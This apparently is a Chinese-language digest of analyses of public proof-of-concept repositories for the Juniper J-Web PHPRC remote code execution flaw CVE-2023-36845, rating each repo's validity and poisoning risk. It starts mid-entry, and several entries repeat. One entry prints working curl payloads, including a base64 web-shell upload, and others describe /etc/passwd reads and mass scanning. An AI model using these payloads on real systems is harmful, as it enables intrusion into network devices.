LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

